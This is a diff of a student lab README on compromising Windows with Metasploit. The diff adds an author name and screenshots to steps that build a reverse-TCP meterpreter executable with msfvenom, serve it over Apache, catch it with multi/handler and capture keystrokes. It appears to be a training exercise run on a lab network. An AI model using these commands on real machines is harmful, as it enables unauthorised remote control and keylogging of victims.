@@ -5,6 +5,9 @@ Compromising windows using Metasploit
 
 ### Developed By
 
+#### Jaiyantan S 
+#### 212224100021
+
 # AIM:
 
 To Compromise windows using Metasploit .
@@ -62,14 +65,14 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
-
-
+<img width="814" height="352" alt="image" src="https://github.com/user-attachments/assets/31b6de6e-7975-4eac-b76d-3bff82321410" />
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
+
 ### Output:
 
-
+<img width="809" height="470" alt="image" src="https://github.com/user-attachments/assets/5d24617f-eb11-4dae-97df-77fcfed95b28" />
 
 copy the fun.exe into the apache ```/var/www/html ```folder
 
@@ -90,14 +93,15 @@ Starting a command and control Server ```use multi/handler``` ```set PAYLOAD win
 
 ### Output 
 
+<img width="803" height="647" alt="image" src="https://github.com/user-attachments/assets/2546c2d0-15ae-4be1-abf7-2eed74aa33f0" />
+
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
-
-
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
 
+<img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/1628715b-f580-4f41-bec5-06b95d08e9e8" />
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
@@ -112,6 +116,8 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
+
+<img width="622" height="207" alt="image" src="https://github.com/user-attachments/assets/916b6527-ea1a-4664-b831-cf3eb2236e84" />
 
 
 
